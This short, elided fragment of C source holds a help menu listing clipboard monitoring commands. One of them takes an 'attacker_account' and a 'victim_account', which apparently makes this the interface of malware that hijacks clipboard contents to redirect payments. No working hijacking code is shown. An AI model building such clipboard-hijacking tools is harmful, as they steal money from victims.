...
void DisplayHelp() {
    ...
    printf("  CLIPBOARD_START <attacker_account> [victim_account] - Start clipboard monitoring\n");
    printf("  CLIPBOARD_STOP   - Stop clipboard monitoring\n");
    printf("  CLIPBOARD_STATUS - Get clipboard monitoring status\n");
    printf("\n");
}
